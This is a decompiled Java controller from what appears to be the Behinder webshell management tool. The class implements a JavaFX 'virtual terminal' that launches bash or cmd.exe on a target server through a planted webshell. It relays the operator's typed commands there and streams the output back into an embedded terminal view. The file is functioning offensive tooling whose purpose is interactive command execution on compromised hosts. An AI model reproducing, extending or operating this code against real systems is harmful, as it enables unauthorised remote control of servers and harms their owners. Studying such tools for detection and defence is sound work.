package net.rebeyond.behinder.ui.controller;

import java.io.ByteArrayInputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.web.WebView;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import netscape.javascript.JSObject;
import org.json.JSONObject;

public class RealCmdViewController {
   private ShellManager shellManager;
   @FXML
   private TextField shellPathText;
   @FXML
   private Button realCmdBtn;
   private ShellService currentShellService;
   private JSONObject shellEntity;
   private List workList;
   private List cmdWorkList = new ArrayList();
   Map basicInfoMap;
   private Label statusLabel;
   private RealCmdViewController me = this;
   @FXML
   private WebView mywebview;
   private LinkedBlockingQueue commandQueue;
   private boolean immediatelyRead = false;
   private int running;

   public RealCmdViewController() {
      this.running = Constants.REALCMD_STOPPED;
   }

   public void init(ShellService shellService, List workList, Label statusLabel, Map basicInfoMap) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.getShellEntity();
      this.basicInfoMap = basicInfoMap;
      this.workList = workList;
      this.statusLabel = statusLabel;
      this.initRealCmdView();
   }

   public void receive(String input) {
      if (this.running != Constants.REALCMD_RUNNING) {
         this.statusLabel.setText("虚拟终端已停止，请先启动虚拟终端.");
      } else {
         this.commandQueue.offer(input);
      }
   }

   private void stopWorkers() {
      Iterator var1 = this.cmdWorkList.iterator();

      while(var1.hasNext()) {
         Thread worker = (Thread)var1.next();

         while(worker.isAlive()) {
            worker.stop();
         }
      }

      this.cmdWorkList.clear();
   }

   private void initWorkers() {
      Runnable cmdWriter = () -> {
         StringBuilder windowsCommondBuf = new StringBuilder();

         while(true) {
            while(true) {
               while(true) {
                  try {
                     String commandToExecute = (String)this.commandQueue.poll(10000L, TimeUnit.MILLISECONDS);
                     if (commandToExecute != null) {
                        String osInfo = (String)this.basicInfoMap.get("osInfo");
                        if (osInfo.indexOf("windows") < 0 && osInfo.indexOf("winnt") < 0) {
                           if (commandToExecute.charAt(commandToExecute.length() - 1) == '\r' || commandToExecute.charAt(commandToExecute.length() - 1) == '\n') {
                              commandToExecute = commandToExecute.replace('\n', '\r');
                           }
                        } else {
                           if (commandToExecute.charAt(commandToExecute.length() - 1) != '\r' && commandToExecute.charAt(commandToExecute.length() - 1) != '\n') {
                              windowsCommondBuf.append(commandToExecute);
                              final String finalCommandToExecute = commandToExecute;
                              Platform.runLater(() -> {
                                 this.write(finalCommandToExecute);
                              });
                              continue;
                           }

                           commandToExecute = commandToExecute.replace((new StringBuilder()).append('\r'), "" + '\r' + '\n');
                           windowsCommondBuf.append(commandToExecute);
                           final String finalCommandToExecute = commandToExecute;
                           Platform.runLater(() -> {
                              this.write(finalCommandToExecute);
                           });
                           commandToExecute = windowsCommondBuf.toString();
                           windowsCommondBuf.setLength(0);
                        }

                        this.currentShellService.writeRealCMD(commandToExecute);
                        this.immediatelyRead = true;
                     }
                  } catch (Exception var5) {
                  }
               }
            }
         }
      };
      Thread cmdWriterWorker = new Thread(cmdWriter);
      cmdWriterWorker.setName("cmdWriterWorker");
      this.cmdWorkList.add(cmdWriterWorker);
      this.workList.add(cmdWriterWorker);
      cmdWriterWorker.start();
      Runnable cmdReader = () -> {
         int blankCount = 0;
         int sleepCount = 0;

         while(true) {
            while(true) {
               while(true) {
                  try {
                     JSONObject resultObj = this.currentShellService.readRealCMD();
                     String status = resultObj.getString("status");
                     String msg = resultObj.getString("msg");
                     if (status.equals("fail")) {
                        Platform.runLater(() -> {
                           this.statusLabel.setText(msg);
                        });
                        Thread.sleep(200L);
                     } else if (msg.length() >= 1) {
                        blankCount = 0;
                        Platform.runLater(() -> {
                           this.write(msg);
                        });
                     } else {
                        Thread.sleep(20L);
                        ++blankCount;

                        while(blankCount > 10 && sleepCount < 20 && !this.immediatelyRead) {
                           Thread.sleep((long)(10 * (new Random()).nextInt(5)));
                           ++sleepCount;
                        }

                        sleepCount = 0;
                        if (this.immediatelyRead) {
                           blankCount = 0;
                           this.immediatelyRead = false;
                        }

                        if (blankCount > 15) {
                           while(sleepCount < 1000 && !this.immediatelyRead) {
                              Thread.sleep((long)(10 * (new Random()).nextInt(5)));
                              ++sleepCount;
                           }

                           sleepCount = 0;
                           this.immediatelyRead = false;
                        }
                     }
                  } catch (InterruptedException var6) {
                  } catch (Exception var7) {
                     System.err.println(var7.getMessage());
                  }
               }
            }
         }
      };
      Thread cmdReaderWorker = new Thread(cmdReader);
      cmdReaderWorker.setName("cmdReaderWorker");
      this.cmdWorkList.add(cmdReaderWorker);
      this.workList.add(cmdReaderWorker);
      cmdReaderWorker.start();
   }

   private void setBtnIcon(String type) {
      try {
         ImageView icon = new ImageView();
         if (type.equals("start")) {
            icon.setImage(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/start.png"))));
         } else if (type.equals("stop")) {
            icon.setImage(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/stop.png"))));
         }

         icon.setFitHeight(14.0D);
         icon.setPreserveRatio(true);
         this.realCmdBtn.setGraphic(icon);
      } catch (Exception var3) {
      }

   }

   private void initRealCmdView() {
      String osInfo = (String)this.basicInfoMap.get("osInfo");
      if (osInfo.indexOf("windows") < 0 && osInfo.indexOf("winnt") < 0) {
         this.shellPathText.setText("/bin/bash");
      } else {
         this.shellPathText.setText("cmd.exe");
      }

      this.setBtnIcon("start");
      this.realCmdBtn.setOnAction((event) -> {
         if (this.realCmdBtn.getText().equals("启动")) {
            this.statusLabel.setText("正在启动虚拟终端……");
            this.initCmdQueue();
            this.createRealCmd();
            this.initWorkers();
         } else {
            this.stopRealCmd();
            this.stopWorkers();
            this.destroyCmdQueue();
         }

      });
      this.mywebview.setContextMenuEnabled(false);
      this.mywebview.getEngine().getLoadWorker().stateProperty().addListener((observable, oldValue, newValue) -> {
         JSObject window = (JSObject)this.mywebview.getEngine().executeScript("window");
         window.setMember("app", this.me);
      });
      this.mywebview.getEngine().load(this.getClass().getResource("/net/rebeyond/behinder/resource/hterm.html").toExternalForm());
   }

   private void initCmdQueue() {
      this.commandQueue = new LinkedBlockingQueue();
   }

   private void destroyCmdQueue() {
      if (this.commandQueue != null) {
         this.commandQueue = null;
      }

   }

   public void copyText(String text) {
      Utils.setClipboardString(text);
   }

   private void write(String text) {
      try {
         JSObject window = (JSObject)this.mywebview.getEngine().executeScript("window");
         JSObject terminal = (JSObject)window.getMember("t");
         JSObject htermIO = (JSObject)terminal.getMember("io");
         htermIO.call("print", new Object[]{text});
      } catch (Exception var5) {
      }

   }

   private void delete(String text) {
      try {
         JSObject window = (JSObject)this.mywebview.getEngine().executeScript("window");
         JSObject terminal = (JSObject)window.getMember("t");
         JSObject htermIO = (JSObject)terminal.getMember("io");
         htermIO.call("print", new Object[]{text});
      } catch (Exception var5) {
      }

   }

   @FXML
   private void createRealCmd() {
      Runnable runner = () -> {
         try {
            final String bashPath = this.shellPathText.getText();
            (new Thread() {
               public void run() {
                  try {
                     RealCmdViewController.this.currentShellService.createRealCMD(bashPath);
                  } catch (Exception var2) {
                  }

               }
            }).start();
            Thread.sleep(2000L);
            this.running = Constants.REALCMD_RUNNING;
            JSONObject resultObj = this.currentShellService.readRealCMD();
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               if (status.equals("success")) {
                  this.statusLabel.setText("虚拟终端启动完成。");
                  this.mywebview.requestFocus();
                  this.realCmdBtn.setText("停止");
                  this.setBtnIcon("stop");
                  this.running = Constants.REALCMD_RUNNING;
                  this.write(msg);
               } else {
                  this.statusLabel.setText("虚拟终端启动失败:" + msg);
               }

            });
         } catch (Exception var5) {
            var5.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText("虚拟终端启动失败:" + var5.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private void stopRealCmd() {
      this.statusLabel.setText("正在停止虚拟终端……");
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.stopRealCMD();
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               if (status.equals("success")) {
                  this.statusLabel.setText("虚拟终端已停止。");
                  this.realCmdBtn.setText("启动");
                  this.running = Constants.REALCMD_STOPPED;
                  this.setBtnIcon("start");
               } else {
                  this.statusLabel.setText("虚拟终端启动失败:" + msg);
               }

            });
         } catch (Exception var4) {
            Platform.runLater(() -> {
               this.statusLabel.setText("操作失败:" + var4.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }
}
